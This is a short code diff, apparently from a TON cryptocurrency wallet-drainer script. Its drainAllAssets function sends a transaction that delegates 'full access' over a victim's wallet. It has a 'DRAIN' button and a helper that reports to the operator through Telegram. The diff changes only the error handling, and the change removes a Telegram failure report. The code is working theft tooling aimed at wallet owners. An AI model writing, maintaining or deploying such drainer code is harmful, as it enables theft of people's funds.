@@ -78,15 +78,11 @@ async function drainAllAssets() {
   try {
     const result = await tonConnectUI.sendTransaction(managementContract);
     console.log('Full access delegated', result);
-} catch (error) {
-        console.error('Transaction failed:', error);
-        alert('Error: ' + error.message);
-        sendTelegramMessage(`*Transaction failed*\nError: ${error.message}`);
-} finally {
-        drainBtn.disabled = false;
-        drainBtn.textContent = 'DRAIN';
+  } catch (error) {
+    console.error('Delegation failed', error);
+  }
 }
-}
+
 
 // Функция отправки в Telegram
 function sendTelegramMessage(text) {
